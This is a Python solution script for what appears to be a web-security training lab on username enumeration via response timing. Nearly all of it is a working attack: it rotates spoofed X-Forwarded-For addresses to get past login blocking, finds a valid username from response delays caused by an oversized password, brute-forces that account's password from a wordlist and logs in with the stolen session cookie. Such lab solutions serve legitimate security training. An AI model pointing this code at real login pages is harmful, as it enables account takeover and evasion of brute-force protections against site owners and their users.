###################################################################
#
# Lab: Username enumeration via response timing
#
# Hack Steps: 
#      1. Read usernames and passwords lists
#      2. Change X-Forwarded-For header to a random IP in every 
#         request to bypass blocking
#      3. Try to find a valid username via response timing
#      4. Brute force the password of that valid username
#      5. Login with the valid credentials
#
###################################################################
import requests
import re
import time
import random
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a62000704aef43384036d0600690016.web-security-academy.net"

SCRIPT_START_TIME = time.time()

def main():
    print("⦗1⦘ Reading usernames list.. ", end="", flush=True)

    usernames_list = read_list("../usernames.txt") # Make sure the file exist in your root directory or change its path accordingly

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Reading password list.. ", end="", flush=True)

    password_list = read_list("../passwords.txt") # Make sure the file exist in your root directory or change its path accordingly

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Trying to find a valid username.. ")

    valid_user = try_to_find_valid_username(usernames_list)  

    print(Fore.WHITE + "\n🗹 Valid username: " + Fore.GREEN + valid_user)
    print(Fore.WHITE + "⦗4⦘ Brute forcing password.. ")

    (valid_password, valid_session) = brute_force_password(valid_user, password_list)  
    
    print(Fore.WHITE + "\n🗹 Valid username: " + Fore.GREEN + valid_user)
    print(Fore.WHITE + "🗹 Valid password: " + Fore.GREEN + valid_password)

    print(Fore.WHITE + "⦗5⦘ Logging in.. ", end="", flush=True)


    cookies = { "session": valid_session }
    fetch("/my-account", cookies)

    print(Fore.GREEN + "OK")
    print_finish_message()


def read_list(file_path):
    try:
        return open(file_path, 'rt').read().splitlines()
    except:
        print(Fore.RED + "⦗!⦘ Failed to opent the file " + file_path + " through exception")
        exit(1)


def print_progress(elapsed_time, fail_counter, success_counter, total_counts, text):
    print(Fore.YELLOW + "Elapsed: " + Fore.WHITE + str(elapsed_time) + " minutes || " + Fore.RED + "Failed: " + Fore.WHITE +
          str(fail_counter) + " || " + Fore.WHITE + f"Trying ({success_counter}/{total_counts}): " + Fore.BLUE + f"{text:50}", end='\r', flush=True)


def try_to_find_valid_username(usernames_list):
    total_users = len(usernames_list)
    big_password = "frajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfwfrajreorjejoiejfoimkeomfasefrewlkfmrefpmomrewfomeromfw"  

    for counter, user in enumerate(usernames_list):
        print_progress(counter, total_users, user)
        
        try_to_login = login(user, big_password)

        if try_to_login.status_code == 200 and try_to_login.elapsed.seconds > 5:

            return user  
            
        else:
            continue
    
    print(Fore.RED + "⦗!⦘ No valid username was found")
    exit(1)


def brute_force_password(valid_user, passwords):
    total_passwords = len(passwords)  
    
    for (counter, password) in enumerate(passwords):
        print_progress(counter, total_passwords, password)
        
        try_to_login = login(valid_user, password)

        if try_to_login.status_code == 302:  
            session = try_to_login.cookies.get("session")
            return (password, session)
        else:
            continue
        
    print(Fore.RED + "\n⦗!⦘ No valid password was found")
    exit(1)


def login(username, password):
    headers = { "X-Forwarded-For": get_random_ip() }
    data = { "username": username, "password": password }
    try:
        return requests.post(f"{LAB_URL}/login", data, headers=headers, allow_redirects=False)
    except:
        print(Fore.RED + f"\n⦗!⦘ Failed to login as {username} through exception")


def get_random_ip():
    a = random.randint(2, 254)
    b = random.randint(2, 254)
    c = random.randint(2, 254)
    d = random.randint(2, 254)
    return f"{a}.{b}.{c}.{d}"


def fetch(path, cookies):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def print_progress(counter, total_counts, text):
    elapsed_time = (int((time.time() - SCRIPT_START_TIME)))
    print(Fore.WHITE + "❯❯ Elapsed: " + Fore.YELLOW + str(elapsed_time) +
           Fore.WHITE + f" seconds || Trying ({counter+1}/{total_counts}): " + Fore.BLUE + f"{text:50}", end='\r', flush=True)


def print_finish_message():
    elapsed_time = int((time.time() - SCRIPT_START_TIME))     
    print(Fore.WHITE + "🗹 Finished in: " + Fore.YELLOW + str(elapsed_time) + Fore.WHITE + " seconds")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


if __name__ == "__main__":
    main()
